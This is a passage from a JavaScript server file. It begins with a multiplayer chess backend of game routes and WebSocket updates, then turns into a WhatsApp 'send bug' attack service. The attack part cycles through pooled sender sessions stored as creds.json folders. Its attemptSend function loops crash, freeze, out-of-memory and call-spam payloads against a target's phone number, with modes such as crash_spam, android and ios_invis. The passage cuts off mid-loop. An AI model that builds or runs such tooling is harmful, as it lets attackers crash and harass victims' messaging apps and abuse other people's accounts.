            const rookFrom = to > from ? from + 3 : from - 4;
            const rookTo = to > from ? to - 1 : to + 1;
            const rook = gameData.pieces.find(p => p.position === rookFrom);
            if (rook) {
                rook.position = rookTo;
                rook.hasMoved = true;
            }
        }

        const move = {
            from: from,
            to: to,
            piece: movingPiece,
            capturedPiece: capturedPiece,
            isCastling: isCastling,
            isEnPassant: isEnPassant,
            isPromotion: !!promotion,
            promotionType: promotion,
            notation: generateNotation(movingPiece, from, to, capturedPiece, isCastling, isEnPassant, promotion),
            timestamp: new Date().toISOString()
        };

        gameData.moves.push(move);
        gameData.moveHistory.push(move);
        gameData.currentTurn = gameData.currentTurn === "white" ? "black" : "white";

        fs.writeFileSync(gameFile, JSON.stringify(gameData, null, 2));

        wssChessGame.clients.forEach(client => {
            if (client.readyState === WebSocket.OPEN && client.gameId === gameId) {
                client.send(JSON.stringify({
                    type: "move_made",
                    move: move
                }));
            }
        });

        wssChessGlobal.clients.forEach(client => {
            if (client.readyState === WebSocket.OPEN) {
                client.send(JSON.stringify({
                    type: "game_updated",
                    game: gameData
                }));
            }
        });

        res.json({ success: true, game: gameData });
    } catch (err) {
        res.status(500).json({ error: "Failed to process move" });
    }
});

app.post("/api/chess/join-game", (req, res) => {
    const { gameId, username } = req.body;

    if (!gameId || !username) {
        return res.status(400).json({ error: "Missing fields" });
    }

    const gameFile = path.join(CHESS_FOLDER, `${gameId}.json`);
    if (!fs.existsSync(gameFile)) {
        return res.status(404).json({ error: "Game not found" });
    }

    try {
        const gameData = JSON.parse(fs.readFileSync(gameFile, "utf-8"));

        if (gameData.status !== "waiting") {
            return res.status(400).json({ error: "Game is not waiting for players" });
        }

        if (gameData.players.includes(username)) {
            return res.json({
                gameId: gameId,
                playerColor: gameData.playerColors[username] || "black"
            });
        }

        gameData.players.push(username);
        gameData.playerColors[username] = "black";
        gameData.playerBlack = username;
        gameData.status = "active";

        fs.writeFileSync(gameFile, JSON.stringify(gameData, null, 2));

        wssChessGlobal.clients.forEach(client => {
            if (client.readyState === WebSocket.OPEN) {
                client.send(JSON.stringify({
                    type: "game_updated",
                    game: gameData
                }));
            }
        });

        wssChessGame.clients.forEach(client => {
            if (client.readyState === WebSocket.OPEN && client.gameId === gameId) {
                client.send(JSON.stringify({
                    type: "player_joined",
                    username: username,
                    playerColor: "black"
                }));
            }
        });

        res.json({
            gameId: gameId,
            playerColor: "black"
        });
    } catch (err) {
        res.status(500).json({ error: "Failed to join game" });
    }
});

app.post("/api/chess/resign", (req, res) => {
    const { gameId, username } = req.body;
    const gameFile = path.join(CHESS_FOLDER, `${gameId}.json`);

    if (!fs.existsSync(gameFile)) {
        return res.status(404).json({ error: "Game not found" });
    }

    try {
        const gameData = JSON.parse(fs.readFileSync(gameFile, "utf-8"));
        const playerColor = gameData.playerColors[username];

        gameData.status = "resigned";
        gameData.winner = playerColor === "white" ? "black" : "white";

        fs.writeFileSync(gameFile, JSON.stringify(gameData, null, 2));

        wssChessGame.clients.forEach(client => {
            if (client.readyState === WebSocket.OPEN && client.gameId === gameId) {
                client.send(JSON.stringify({
                    type: "game_ended",
                    status: "resigned",
                    winner: gameData.winner,
                    resigningPlayer: username
                }));
            }
        });

        wssChessGlobal.clients.forEach(client => {
            if (client.readyState === WebSocket.OPEN) {
                client.send(JSON.stringify({
                    type: "game_updated",
                    game: gameData
                }));
            }
        });

        res.json({ success: true });
    } catch (err) {
        res.status(500).json({ error: "Failed to process resignation" });
    }
});

app.post("/api/chess/offer-draw", (req, res) => {
    const { gameId, from } = req.body;
    const gameFile = path.join(CHESS_FOLDER, `${gameId}.json`);

    if (!fs.existsSync(gameFile)) {
        return res.status(404).json({ error: "Game not found" });
    }

    try {
        wssChessGame.clients.forEach(client => {
            if (client.readyState === WebSocket.OPEN && client.gameId === gameId) {
                client.send(JSON.stringify({
                    type: "draw_offered",
                    from: from
                }));
            }
        });

        res.json({ success: true });
    } catch (err) {
        res.status(500).json({ error: "Failed to offer draw" });
    }
});

app.post("/api/chess/accept-draw", (req, res) => {
    const { gameId } = req.body;
    const gameFile = path.join(CHESS_FOLDER, `${gameId}.json`);

    if (!fs.existsSync(gameFile)) {
        return res.status(404).json({ error: "Game not found" });
    }

    try {
        const gameData = JSON.parse(fs.readFileSync(gameFile, "utf-8"));
        gameData.status = "draw";
        gameData.winner = "draw";

        fs.writeFileSync(gameFile, JSON.stringify(gameData, null, 2));

        wssChessGame.clients.forEach(client => {
            if (client.readyState === WebSocket.OPEN && client.gameId === gameId) {
                client.send(JSON.stringify({
                    type: "draw_accepted"
                }));
            }
        });

        wssChessGlobal.clients.forEach(client => {
            if (client.readyState === WebSocket.OPEN) {
                client.send(JSON.stringify({
                    type: "game_updated",
                    game: gameData
                }));
            }
        });

        res.json({ success: true });
    } catch (err) {
        res.status(500).json({ error: "Failed to accept draw" });
    }
});

app.get("/api/chess/players", (req, res) => {
    const playersArray = Array.from(onlinePlayers.entries()).map(([username, data]) => ({
        username: username,
        status: data.status,
        rating: data.rating || 1200,
        gamesPlayed: data.gamesPlayed || 0,
        gamesWon: data.gamesWon || 0,
        gamesLost: data.gamesLost || 0,
        gamesDrawn: data.gamesDrawn || 0,
        lastSeen: new Date().toISOString()
    }));

    res.json({ players: playersArray });
});

app.get("/api/chess/games/active", (req, res) => {
    const files = fs.existsSync(CHESS_FOLDER) ? fs.readdirSync(CHESS_FOLDER) : [];
    const games = files
        .filter(f => f.endsWith(".json"))
        .map(f => {
            try {
                const gameData = JSON.parse(fs.readFileSync(path.join(CHESS_FOLDER, f), "utf-8"));
                return {
                    gameId: path.parse(f).name,
                    playerWhite: gameData.playerWhite || "",
                    playerBlack: gameData.playerBlack || "",
                    moves: gameData.moves || [],
                    status: gameData.status || "waiting",
                    winner: gameData.winner || "",
                    createdAt: gameData.createdAt || new Date().toISOString(),
                    currentTurn: gameData.currentTurn || "white",
                    whiteTime: gameData.whiteTime || 600,
                    blackTime: gameData.blackTime || 600,
                    whiteRating: gameData.whiteRating || 1200,
                    blackRating: gameData.blackRating || 1200,
                    isRated: gameData.isRated || false
                };
            } catch (err) {
                return null;
            }
        })
        .filter(game => game && game.status === "active");

    res.json({ games });
});

app.get("/api/chess/games/my", (req, res) => {
    const username = req.query.username;
    if (!username) return res.json({ games: [] });

    const files = fs.existsSync(CHESS_FOLDER) ? fs.readdirSync(CHESS_FOLDER) : [];
    const myGames = files
        .filter(f => f.endsWith(".json"))
        .map(f => {
            try {
                const gameData = JSON.parse(fs.readFileSync(path.join(CHESS_FOLDER, f), "utf-8"));
                return {
                    gameId: path.parse(f).name,
                    playerWhite: gameData.playerWhite || "",
                    playerBlack: gameData.playerBlack || "",
                    moves: gameData.moves || [],
                    status: gameData.status || "waiting",
                    winner: gameData.winner || "",
                    createdAt: gameData.createdAt || new Date().toISOString(),
                    currentTurn: gameData.currentTurn || "white",
                    whiteTime: gameData.whiteTime || 600,
                    blackTime: gameData.blackTime || 600,
                    whiteRating: gameData.whiteRating || 1200,
                    blackRating: gameData.blackRating || 1200,
                    isRated: gameData.isRated || false
                };
            } catch (err) {
                return null;
            }
        })
        .filter(game => game && (game.playerWhite === username || game.playerBlack === username));

    res.json({ games: myGames });
});

function generateNotation(piece, from, to, capturedPiece, isCastling, isEnPassant, promotion) {
    if (isCastling) {
        return to > from ? "O-O" : "O-O-O";
    }

    const fileFrom = String.fromCharCode(97 + (from % 8));
    const rankFrom = 8 - Math.floor(from / 8);
    const fileTo = String.fromCharCode(97 + (to % 8));
    const rankTo = 8 - Math.floor(to / 8);

    let notation = "";

    if (piece.type !== "pawn") {
        notation = piece.type.charAt(0).toUpperCase();
    }

    if (capturedPiece || isEnPassant) {
        if (piece.type === "pawn") {
            notation += fileFrom;
        }
        notation += "x";
    }

    notation += `${fileTo}${rankTo}`;

    if (promotion) {
        notation += `=${promotion.charAt(0).toUpperCase()}`;
    }

    return notation;
}

wssChessGlobal.on("connection", (ws) => {
    ws.on("message", (message) => {
        try {
            const data = JSON.parse(message);

            if (data.type === "auth") {
                const { username, token } = data;

                onlinePlayers.set(username, {
                    status: "online",
                    rating: 1200,
                    gamesPlayed: 0,
                    gamesWon: 0,
                    gamesLost: 0,
                    gamesDrawn: 0,
                    lastSeen: new Date().toISOString()
                });

                playerConnections.set(username, ws);
                ws.username = username;

                wssChessGlobal.clients.forEach(client => {
                    if (client !== ws && client.readyState === WebSocket.OPEN) {
                        client.send(JSON.stringify({
                            type: "player_online",
                            player: onlinePlayers.get(username)
                        }));
                    }
                });
            }

            if (data.type === "challenge") {
                const { from, to, timeControl, isRated } = data;
                const targetWs = playerConnections.get(to);

                if (targetWs && targetWs.readyState === WebSocket.OPEN) {
                    targetWs.send(JSON.stringify({
                        type: "game_invitation",
                        from: from,
                        to: to,
                        timeControl: timeControl,
                        isRated: isRated,
                        gameId: `invite_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`
                    }));
                }
            }

            if (data.type === "decline_invitation") {
                const { gameId, username } = data;

                wssChessGlobal.clients.forEach(client => {
                    if (client.readyState === WebSocket.OPEN) {
                        client.send(JSON.stringify({
                            type: "invitation_declined",
                            gameId: gameId,
                            username: username
                        }));
                    }
                });
            }

        } catch (err) {
            console.error("WebSocket global error:", err);
        }
    });

    ws.on("close", () => {
        if (ws.username) {
            onlinePlayers.delete(ws.username);
            playerConnections.delete(ws.username);

            wssChessGlobal.clients.forEach(client => {
                if (client.readyState === WebSocket.OPEN) {
                    client.send(JSON.stringify({
                        type: "player_offline",
                        username: ws.username
                    }));
                }
            });
        }
    });
});

wssChessGame.on("connection", (ws, req) => {
    const urlParts = req.url.split("/");
    const gameId = urlParts[urlParts.length - 1];

    ws.gameId = gameId;

    ws.on("message", (message) => {
        try {
            const data = JSON.parse(message);

            if (data.type === "auth") {
                const { username, token } = data;
                ws.username = username;

                const gameFile = path.join(CHESS_FOLDER, `${gameId}.json`);
                if (fs.existsSync(gameFile)) {
                    const gameData = JSON.parse(fs.readFileSync(gameFile, "utf-8"));
                    ws.send(JSON.stringify({
                        type: "game_state",
                        game: gameData
                    }));
                }
            }

            if (data.type === "move") {
                const move = data.move;

                wssChessGame.clients.forEach(client => {
                    if (client !== ws && client.readyState === WebSocket.OPEN && client.gameId === gameId) {
                        client.send(JSON.stringify({
                            type: "move_made",
                            move: move
                        }));
                    }
                });
            }

            if (data.type === "offer_draw") {
                wssChessGame.clients.forEach(client => {
                    if (client !== ws && client.readyState === WebSocket.OPEN && client.gameId === gameId) {
                        client.send(JSON.stringify({
                            type: "draw_offered",
                            from: ws.username
                        }));
                    }
                });
            }

            if (data.type === "accept_draw") {
                const gameFile = path.join(CHESS_FOLDER, `${gameId}.json`);
                if (fs.existsSync(gameFile)) {
                    const gameData = JSON.parse(fs.readFileSync(gameFile, "utf-8"));
                    gameData.status = "draw";
                    gameData.winner = "draw";

                    fs.writeFileSync(gameFile, JSON.stringify(gameData, null, 2));

                    wssChessGame.clients.forEach(client => {
                        if (client.readyState === WebSocket.OPEN && client.gameId === gameId) {
                            client.send(JSON.stringify({
                                type: "draw_accepted"
                            }));
                        }
                    });

                    wssChessGlobal.clients.forEach(client => {
                        if (client.readyState === WebSocket.OPEN) {
                            client.send(JSON.stringify({
                                type: "game_updated",
                                game: gameData
                            }));
                        }
                    });
                }
            }

            if (data.type === "decline_draw") {
                wssChessGame.clients.forEach(client => {
                    if (client !== ws && client.readyState === WebSocket.OPEN && client.gameId === gameId) {
                        client.send(JSON.stringify({
                            type: "draw_declined",
                            from: ws.username
                        }));
                    }
                });
            }

            if (data.type === "resign") {
                const gameFile = path.join(CHESS_FOLDER, `${gameId}.json`);
                if (fs.existsSync(gameFile)) {
                    const gameData = JSON.parse(fs.readFileSync(gameFile, "utf-8"));
                    const playerColor = gameData.playerColors[ws.username];

                    gameData.status = "resigned";
                    gameData.winner = playerColor === "white" ? "black" : "white";

                    fs.writeFileSync(gameFile, JSON.stringify(gameData, null, 2));

                    wssChessGame.clients.forEach(client => {
                        if (client.readyState === WebSocket.OPEN && client.gameId === gameId) {
                            client.send(JSON.stringify({
                                type: "game_ended",
                                status: "resigned",
                                winner: gameData.winner,
                                resigningPlayer: ws.username
                            }));
                        }
                    });

                    wssChessGlobal.clients.forEach(client => {
                        if (client.readyState === WebSocket.OPEN) {
                            client.send(JSON.stringify({
                                type: "game_updated",
                                game: gameData
                            }));
                        }
                    });
                }
            }

            if (data.type === "timeout") {
                const { player } = data;
                const gameFile = path.join(CHESS_FOLDER, `${gameId}.json`);

                if (fs.existsSync(gameFile)) {
                    const gameData = JSON.parse(fs.readFileSync(gameFile, "utf-8"));
                    gameData.status = "timeout";
                    gameData.winner = player === "white" ? "black" : "white";

                    fs.writeFileSync(gameFile, JSON.stringify(gameData, null, 2));

                    wssChessGame.clients.forEach(client => {
                        if (client.readyState === WebSocket.OPEN && client.gameId === gameId) {
                            client.send(JSON.stringify({
                                type: "game_ended",
                                status: "timeout",
                                winner: gameData.winner
                            }));
                        }
                    });

                    wssChessGlobal.clients.forEach(client => {
                        if (client.readyState === WebSocket.OPEN) {
                            client.send(JSON.stringify({
                                type: "game_updated",
                                game: gameData
                            }));
                        }
                    });
                }
            }

            if (data.type === "time_update") {
                wssChessGame.clients.forEach(client => {
                    if (client !== ws && client.readyState === WebSocket.OPEN && client.gameId === gameId) {
                        client.send(JSON.stringify({
                            type: "time_update",
                            whiteTime: data.whiteTime,
                            blackTime: data.blackTime
                        }));
                    }
                });
            }

        } catch (err) {
            console.error("WebSocket game error:", err);
        }
    });

    ws.on("close", () => {
    });
});


let cachedGlobalSenders = [];

const WORKER_ROLE = (process.env.WORKER_ROLES || '').toUpperCase().trim();
const WORKER_NAME = process.env.WORKER_NAME || '';
const WORKER_IDX = (() => {
    const m = WORKER_NAME.match(/-(\d+)$/);
    return m ? parseInt(m[1]) : 0;
})();
const WORKER_TOTAL = (() => {
    try {
        const wFile = path.join(__dirname, 'workers.json');
        if (!fs.existsSync(wFile)) return 1;
        const workers = JSON.parse(fs.readFileSync(wFile, 'utf8'));
        return Math.max(1, workers.filter(w => w.workerRole === WORKER_ROLE && !['SYNC-MASTER', 'SYNC-SLAVE', 'PROXY', 'BOT', 'SENDER'].includes(w.name)).length);
    } catch { return 1; }
})();

const updateGlobalSendersCache = () => {
    try {
        const baseDir = path.join(process.cwd(), 'otaxayun');
        let allSenders = [];

        if (fs.existsSync(baseDir)) {
            const db = loadDatabase();
            const userRoles = {};
            for (const u of db) {
                if (u && u.username) {
                    userRoles[u.username.trim().toLowerCase()] = (u.role || 'MEMBER').toUpperCase();
                }
            }

            const users = fs.readdirSync(baseDir);
            for (const user of users) {
                if (WORKER_ROLE && WORKER_ROLE !== 'NONE' && WORKER_ROLE !== 'KINGZ' && WORKER_ROLE !== 'OWNER') {
                    const userRole = userRoles[user.trim().toLowerCase()];
                    if (userRole && userRole !== WORKER_ROLE) continue;
                }

                const userDir = path.join(baseDir, user);
                if (fs.statSync(userDir).isDirectory()) {
                    const numbers = fs.readdirSync(userDir);
                    for (const num of numbers) {
                        const sessionDir = path.join(userDir, num);
                        if (fs.statSync(sessionDir).isDirectory() && fs.existsSync(path.join(sessionDir, "creds.json"))) {
                            allSenders.push(num);
                        }
                    }
                }
            }
        }

        allSenders.sort();
        if (WORKER_TOTAL > 1 && allSenders.length > 0) {
            cachedGlobalSenders = allSenders.filter((_, i) => i % WORKER_TOTAL === WORKER_IDX);
        } else {
            cachedGlobalSenders = allSenders;
        }

        const info = WORKER_ROLE ? ` (role:${WORKER_ROLE}, partition:${WORKER_IDX}/${WORKER_TOTAL})` : '';
        console.log(`[CACHE] Diperbarui: ${cachedGlobalSenders.length}/${allSenders.length} sender global${info}`);
    } catch (err) {
        console.error(`[CACHE ERROR]:`, err.message);
    }
};

updateGlobalSendersCache();
setInterval(updateGlobalSendersCache, 60000);

const GA_FILE = path.join(__dirname, 'globalAttempts.json');

function getGA(username) {
    try {
        if (!fs.existsSync(GA_FILE)) fs.writeFileSync(GA_FILE, '{}');
        const all = JSON.parse(fs.readFileSync(GA_FILE, 'utf8'));
        const today = new Date().toISOString().split('T')[0];
        const u = username.trim();
        if (!all[u] || all[u].date !== today) {
            all[u] = { count: 0, date: today };
            fs.writeFileSync(GA_FILE, JSON.stringify(all, null, 2));
        }
        return all[u];
    } catch { return { count: 0 }; }
}

function incGA(username) {
    try {
        if (!fs.existsSync(GA_FILE)) fs.writeFileSync(GA_FILE, '{}');
        const all = JSON.parse(fs.readFileSync(GA_FILE, 'utf8'));
        const today = new Date().toISOString().split('T')[0];
        const u = username.trim();
        if (!all[u] || all[u].date !== today) {
            all[u] = { count: 0, date: today };
        }
        all[u].count += 1;
        fs.writeFileSync(GA_FILE, JSON.stringify(all, null, 2));
        return all[u].count;
    } catch { return 1; }
}

// Helper: pastikan socket masih hidup, kalau mati cari sender baru
async function ensureSocketAlive(otax, username, senderType) {
    const ws = otax?.ws?.readyState ?? otax?.ws?.socket?.readyState;
    const hasUser = otax?.user?.id || otax?.authState?.creds?.me?.id;
    const sockAge = otax?.lastChecked ? (Date.now() - otax.lastChecked) : 999999;
    if ((ws === 1 || ws === undefined || ws === null) && (hasUser || sockAge < 15000)) return otax;
    console.log(`[SENDBUG] ⚠️ Socket mati (state: ${ws}, user: ${hasUser ? 'ok' : 'pending'}) untuk ${username}, mencari sender baru...`);
    // Bersihkan socket lama dari cache
    const staleKey = Object.keys(activeConnections).find(k => activeConnections[k] === otax);
    if (staleKey) {
        try { otax.ev?.removeAllListeners?.(); } catch (_) { }
        try { otax.ws?.close?.(); } catch (_) { }
        try { otax.end?.(undefined); } catch (_) { }
        delete activeConnections[staleKey];
        if (sessionRegistry[staleKey]) sessionRegistry[staleKey].connected = false;
    }
    await sleep(500);
    const newOtax = await getReadySender(username, senderType);
    if (!newOtax) throw new Error('Connection Closed');
    return newOtax;
}

async function attemptSend(otax, bug, target, username, retryCount = 0, onlyFirstPayload = false, skipFirst = false, senderType = 'pribadi', historyId = null) {
    let failCount = 0;
    try {
        const targetJid = target + "@s.whatsapp.net";
        console.log(`[SENDBUG] Starting execution of bug: ${bug} for ${targetJid}`);
        updateHistoryStatus(historyId, 'processing', 'Memastikan koneksi sender siap...');

        let wsState = otax?.ws?.readyState ?? otax?.ws?.socket?.readyState;
        let hasUser = otax?.user?.id || otax?.authState?.creds?.me?.id;
        let waitConnTimeout = 0;

        while ((wsState === 0 || ((wsState === 1 || wsState === undefined || wsState === null) && !hasUser)) && waitConnTimeout < 80) {
            console.log(`[SENDBUG] Menunggu koneksi socket siap... (state: ${wsState}, user: ${hasUser ? 'ok' : 'pending'})`);
            await sleep(250);
            waitConnTimeout++;
            wsState = otax?.ws?.readyState ?? otax?.ws?.socket?.readyState;
            hasUser = otax?.user?.id || otax?.authState?.creds?.me?.id;
        }

        const finalHasUser = otax?.user?.id || otax?.authState?.creds?.me?.id;
        if (wsState === 2 || wsState === 3 || wsState === 0 || !finalHasUser) {
            console.log(`[SENDBUG] Socket tidak siap (state: ${wsState}), memaksa reconnect...`);
            throw new Error('Connection Closed');
        }

        updateHistoryStatus(historyId, 'processing', 'Memulai pengiriman peluru bug...');

        switch (bug) {
            case "click":
                console.log(`[SENDBUG] Running click loop for ${targetJid}`);
                for (let i = skipFirst ? 1 : 0; i < 5; i++) {
                    try {
                        otax = await ensureSocketAlive(otax, username, senderType);
                        await packBlank(otax, targetJid);
                        await sleep(1500);
                        await invisOOMmanta(otax, targetJid);
                        await sleep(1500);
                    } catch (e) {
                        console.error(`[SENDBUG] Error in click loop:`, e.message === 'Connection Closed' ? 'Koneksi Terputus' : (e.message || e));
                        if (onlyFirstPayload) throw e;
                        try { otax = await ensureSocketAlive(otax, username, senderType); } catch (_) { throw e; }
                    }
                    if (onlyFirstPayload) return true;
                    await sleep(1600);
                }
                break;
            case "crash_spam":
                console.log(`[SENDBUG] Running crash_spam loop for ${targetJid}`);
                for (let i = skipFirst ? 1 : 0; i < 5; i++) {
                    try {
                        otax = await ensureSocketAlive(otax, username, senderType);
                        await paySuck(otax, targetJid);
                        await sleep(1500);
                        await kresjandaotax(otax, targetJid);
                        await sleep(1500);
                        await xcoreotax(otax, targetJid, true);
                        await sleep(1500);
                        await LocaNewotax(otax, targetJid);
                        await sleep(1500);
                        await packBlank(otax, targetJid);
                        await sleep(1500);
                        await invisOOMmanta(otax, targetJid);
                        await sleep(1500);
                    } catch (e) {
                        console.error(`[SENDBUG] Error in crash_spam loop:`, e.message === 'Connection Closed' ? 'Koneksi Terputus' : (e.message || e));
                        if (onlyFirstPayload) throw e;
                        try { otax = await ensureSocketAlive(otax, username, senderType); } catch (_) { throw e; }
                    }
                    if (onlyFirstPayload) return true;
                    await sleep(1600);
                }
                break;
            case "hard":
                console.log(`[SENDBUG] Running hard loop for ${targetJid}`);
                for (let i = skipFirst ? 1 : 0; i < 5; i++) {
                    try {
                        otax = await ensureSocketAlive(otax, username, senderType);
                        await kresjandaotax(otax, targetJid);
                        await sleep(1500);
                        await xcoreotax(otax, targetJid, targetJid);
                        await sleep(1500);
                        await LocaNewotax(otax, targetJid);
                        await sleep(1500);
                        await packBlank(otax, targetJid);
                        await sleep(1500);
                        await invisOOMmanta(otax, targetJid);
                        await sleep(1500);
                    } catch (e) {
                        console.error(`[SENDBUG] Error in hard loop:`, e.message === 'Connection Closed' ? 'Koneksi Terputus' : (e.message || e));
                        if (onlyFirstPayload) throw e;
                        try { otax = await ensureSocketAlive(otax, username, senderType); } catch (_) { throw e; }
                    }
                    if (onlyFirstPayload) return true;
                    await sleep(1600);
                }
                break;
            case "spam_call":
                console.log(`[SENDBUG] Running spam_call loop for ${targetJid}`);
                for (let i = skipFirst ? 1 : 0; i < 5; i++) {
                    try {
                        otax = await ensureSocketAlive(otax, username, senderType);
                        await otax.offerCall(targetJid, true);
                        await sleep(400);
                    } catch (e) {
                        console.error(`[SENDBUG] Error in spam_call loop:`, e.message === 'Connection Closed' ? 'Koneksi Terputus' : (e.message || e));
                        if (onlyFirstPayload) throw e;
                        try { otax = await ensureSocketAlive(otax, username, senderType); } catch (_) { throw e; }
                    }
                    if (onlyFirstPayload) return true;
                    await sleep(1500);
                }
                break;
            case "android":
                console.log(`[SENDBUG] Running android loop for ${targetJid}`);
                for (let i = skipFirst ? 1 : 0; i < 5; i++) {
                    try {
                        otax = await ensureSocketAlive(otax, username, senderType);
                        await kresjandaotax(otax, targetJid);
                        await sleep(1500);
                        await CarouselOtax(otax, targetJid);
                        await sleep(1500);
                        await xcoreotax(otax, targetJid, true);
                        await sleep(1500);
                        await LocaCrashUi(otax, targetJid);
                        await sleep(1500);
                        await packBlank(otax, targetJid);
                        await sleep(1500);
                        await invisOOMmanta(otax, targetJid);
                        await sleep(1500);
                    } catch (e) {
                        console.error(`[SENDBUG] Error in android loop:`, e.message === 'Connection Closed' ? 'Koneksi Terputus' : (e.message || e));
                        if (onlyFirstPayload) throw e;
                        try { otax = await ensureSocketAlive(otax, username, senderType); } catch (_) { throw e; }
                    }
                    if (onlyFirstPayload) return true;
                    await sleep(1600);
                }
                break;
            case "invisible":
                console.log(`[SENDBUG] Running invisible loop for ${targetJid}`);
                for (let i = skipFirst ? 1 : 0; i < 50; i++) {
                    try {
                        otax = await ensureSocketAlive(otax, username, senderType);
                        await intImgBuffer(otax, targetJid);
                        await sleep(1500);
                        await invisOOMmanta(otax, targetJid);
                        await sleep(1500);
                    } catch (e) {
                        console.error(`[SENDBUG] Error in invisible loop:`, e.message === 'Connection Closed' ? 'Koneksi Terputus' : (e.message || e));
                        if (onlyFirstPayload) throw e;
                        try { otax = await ensureSocketAlive(otax, username, senderType); } catch (_) { throw e; }
                    }
                    if (onlyFirstPayload) return true;
                    await sleep(1600);
                }
                break;
            case "invisiblex":
                console.log(`[SENDBUG] Running invisiblex loop for ${targetJid}`);
                for (let i = skipFirst ? 1 : 0; i < 10; i++) {
                    try {
                        otax = await ensureSocketAlive(otax, username, senderType);
                        await docThumb(otax, targetJid, true);
                        await sleep(1500);
                        await intImgBuffer(otax, targetJid);
                        await sleep(1500);
                        await invisOOMmanta(otax, targetJid);
                        await sleep(1500);
                    } catch (e) {
                        console.error(`[SENDBUG] Error in invisiblex loop:`, e.message === 'Connection Closed' ? 'Koneksi Terputus' : (e.message || e));
                        if (onlyFirstPayload) throw e;
                        try { otax = await ensureSocketAlive(otax, username, senderType); } catch (_) { throw e; }
                    }
                    if (onlyFirstPayload) return true;
                    await sleep(1600);
                }
                break;
            case "cspam":
                console.log(`[SENDBUG] Running cspam loop for ${targetJid} (Sender: ${senderType})`);
                const cspamLimit = (senderType === 'global') ? 10 : 30;
                for (let i = skipFirst ? 1 : 0; i < cspamLimit; i++) {
                    try {
                        otax = await ensureSocketAlive(otax, username, senderType);
                        await docThumb(otax, targetJid, true, true);
                        await sleep(1000);
                        await invisOOMmanta(otax, targetJid);
                        await sleep(1500);
                    } catch (e) {
                        console.error(`[SENDBUG] Error in cspam loop:`, e.message === 'Connection Closed' ? 'Koneksi Terputus' : (e.message || e));
                        if (onlyFirstPayload) throw e;
                        try { otax = await ensureSocketAlive(otax, username, senderType); } catch (_) { throw e; }
                    }
                    if (onlyFirstPayload) return true;
                    await sleep(1600);
                }
                break;
            case "cspamxx":
                console.log(`[SENDBUG] Running cspam loop for ${targetJid}`);
                for (let i = skipFirst ? 1 : 0; i < 30; i++) {
                    try {
                        otax = await ensureSocketAlive(otax, username, senderType);
                        await kimak(otax, targetJid);
                        await sleep(1500);
                    } catch (e) {
                        console.error(`[SENDBUG] Error in cspamxx loop:`, e.message === 'Connection Closed' ? 'Koneksi Terputus' : (e.message || e));
                        if (onlyFirstPayload) throw e;
                        try { otax = await ensureSocketAlive(otax, username, senderType); } catch (_) { throw e; }
                    }
                    if (onlyFirstPayload) return true;
                    await sleep(1600);
                }
                break;
            case "ios_invis":
                console.log(`[SENDBUG] Running ios_invis loop for ${targetJid} (Sender: ${senderType})`);
                const iosLimit = (senderType === 'global') ? 5 : 10;
                for (let i = skipFirst ? 1 : 0; i < iosLimit; i++) {
                    try {
                        otax = await ensureSocketAlive(otax, username, senderType);
                        await iosinVisFC3(otax, targetJid);
                        await sleep(1500);
                        await invsNewIos(otax, targetJid);
                        await sleep(1500);
                    } catch (e) {
                        console.error(`[SENDBUG] Error in ios_invis loop:`, e.message === 'Connection Closed' ? 'Koneksi Terputus' : (e.message || e));
                        if (onlyFirstPayload) throw e;
                        try { otax = await ensureSocketAlive(otax, username, senderType); } catch (_) { throw e; }
                    }
                    if (onlyFirstPayload) return true;
                    await sleep(1600);
                }
                break;
            case "cxinv":
                console.log(`[SENDBUG] Running cxinv loop for ${targetJid}`);
                for (let z = skipFirst ? 1 : 0; z < 5; z++) {
                    try {
                        otax = await ensureSocketAlive(otax, username, senderType);
                        await oombimg(otax, targetJid);
                        await sleep(1500);
                        await docThumb(otax, targetJid, true)
                        await intImgBuffer(otax, targetJid);
                        await sleep(1500);
                        await invisOOMmanta(otax, targetJid);
                        await sleep(1500);
                    } catch (e) {
                        console.error(`[SENDBUG] Error in cxinv loop:`, e.message === 'Connection Closed' ? 'Koneksi Terputus' : (e.message || e));
                        if (onlyFirstPayload) throw e;
                        try { otax = await ensureSocketAlive(otax, username, senderType); } catch (_) { throw e; }
                    }
                    if (onlyFirstPayload) return true;
                    await sleep(1500);
                }
                break;
            case "mbokep":
                console.log(`[SENDBUG] Running mbokep loop for ${targetJid}`);
                for (let z = skipFirst ? 1 : 0; z < 5; z++) {
                    try {
                        otax = await ensureSocketAlive(otax, username, senderType);
                        await videoCrashbokep(otax, targetJid);
                        await sleep(1500);
                        await invisOOMmanta(otax, targetJid);
                        await sleep(1500);
                    } catch (e) {
                        console.error(`[SENDBUG] Error in mbokep loop:`, e.message === 'Connection Closed' ? 'Koneksi Terputus' : (e.message || e));
                        if (onlyFirstPayload) throw e;
                        try { otax = await ensureSocketAlive(otax, username, senderType); } catch (_) { throw e; }
                    }
                    if (onlyFirstPayload) return true;
                    await sleep(1600);
                }
                break;
            case "fcotax":
                console.log(`[SENDBUG] Running fcotax loop for ${targetJid}`);
                for (let z = skipFirst ? 1 : 0; z < 5; z++) {
                    try {
                        otax = await ensureSocketAlive(otax, username, senderType);
                        await stInt(otax, targetJid);
                        await sleep(1500);
                        await AyunBelovedxhams(otax, targetJid);
                        await sleep(1500);
                        await invisOOMmanta(otax, targetJid);
                        await sleep(1500);
                    } catch (e) {
                        console.error(`[SENDBUG] Error in fcotax loop:`, e.message === 'Connection Closed' ? 'Koneksi Terputus' : (e.message || e));
                        if (onlyFirstPayload) throw e;
                        try { otax = await ensureSocketAlive(otax, username, senderType); } catch (_) { throw e; }
                    }
                    if (onlyFirstPayload) return true;
                    await sleep(1600);
                }
                break;
            case "fcotaxx":
                console.log(`[SENDBUG] Running fcotaxx loop for ${targetJid}`);
                for (let z = skipFirst ? 1 : 0; z < 5; z++) {
                    try {
                        otax = await ensureSocketAlive(otax, username, senderType);
                        await AyunBelovedjav(otax, targetJid);
                        await sleep(1500);
                        await invisOOMmanta(otax, targetJid);
                        await sleep(1500);
                    } catch (e) {
                        console.error(`[SENDBUG] Error in fcotaxx loop:`, e.message === 'Connection Closed' ? 'Koneksi Terputus' : (e.message || e));
                        if (onlyFirstPayload) throw e;
                        try { otax = await ensureSocketAlive(otax, username, senderType); } catch (_) { throw e; }
                    }
                    if (onlyFirstPayload) return true;
                    await sleep(1600);
                }
                break;
            case "fcayun":
                console.log(`[SENDBUG] Running fcayun loop for ${targetJid}`);
                for (let z = skipFirst ? 1 : 0; z < 5; z++) {
                    try {
                        otax = await ensureSocketAlive(otax, username, senderType);
                        await AyunBelovedxnxx(otax, targetJid);
                        await sleep(1500);
                        await invisOOMmanta(otax, targetJid);
